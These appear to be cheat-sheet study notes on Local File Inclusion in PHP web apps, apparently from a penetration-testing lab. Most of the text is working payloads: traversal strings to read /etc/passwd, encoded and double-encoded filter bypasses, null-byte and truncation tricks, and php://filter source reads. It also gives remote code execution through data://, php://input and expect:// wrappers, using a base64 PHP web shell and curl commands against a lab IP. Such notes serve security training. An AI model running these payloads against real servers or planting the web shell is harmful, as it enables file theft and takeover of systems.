File Disclosure - LFI (Local File Inclusion)***
The most common place we usually find LFI within is templating engines. (header, navigation bar, and footer)
This is why we often see a parameter like /index.php?page=about, where index.php sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called about.php.
Each of them has a slightly different approach to including local files, but they all share one common thing: loading a file from a specified path.
 Basic LFI 	
 /index.php?language=/etc/passwd 	Basic LFI
 /index.php?language=../../../../etc/passwd 	LFI with path traversal
 /index.php?language=/../../../etc/passwd 	LFI with name prefix
 /index.php?language=./languages/../../../../etc/passwd 	LFI with approved path

C:\Windows\boot.ini
/var/www/html/ we are 3 directories away from the root path

File Disclosure - LFI bypass ***
One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals.
....//....//....//....//etc/passwd
or encoded:
....//....//....//....//etc/passwd => %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64

double encoded = %25%32%65%25%32%65%25%32%65%25%32%65%25%32%66%25%32%66%25%32%65%25%32%65%25%32%65%25%32%65%25%32%66%25%32%66%25%32%65%25%32%65%25%32%65%25%32%65%25%32%66%25%32%66%25%32%65%25%32%65%25%32%65%25%32%65%25%32%66%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34

/..././..././..././..././etc/passwd

 /index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times] 	Bypass appended extension with path truncation (obsolete)
 /index.php?language=../../../../etc/passwd%00 			Bypass appended extension with null byte (obsolete)
 /index.php?language=php://filter/read=convert.base64-encode/resource=config		Read PHP with base64 filter

 echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

 File Disclosure - PHP Filters ***
 Source Code Disclosure:
 https://www.php.net/manual/en/wrappers.php.php
 http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config

Fuzzing php files:
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
 http://<SERVER_IP>:<PORT>/index.php?language=config
 http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=configure

 Remote Code Execution - PHP Wrappers ***

 -Data Wrappers:
 https://www.php.net/manual/en/wrappers.data.php
 1.curl "http://94.237.62.195:43859/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
 2.echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include.  ==> allow_url_include = On
 Excellent! We see that we have this option enabled, so we can use the data wrapper
 With allow_url_include enabled, we can proceed with our data wrapper attack.
 3.echo '<?php system($_GET["cmd"]); ?>' | base64 =>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 4.http://http://94.237.62.195:43859/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

 -Input wrapper:
 https://www.php.net/manual/en/wrappers.php.php
 the input wrapper also depends on the allow_url_include setting, as mentioned earlier.
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

 -Expect wrapper: 
 https://www.php.net/manual/en/wrappers.expect.php
 echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 

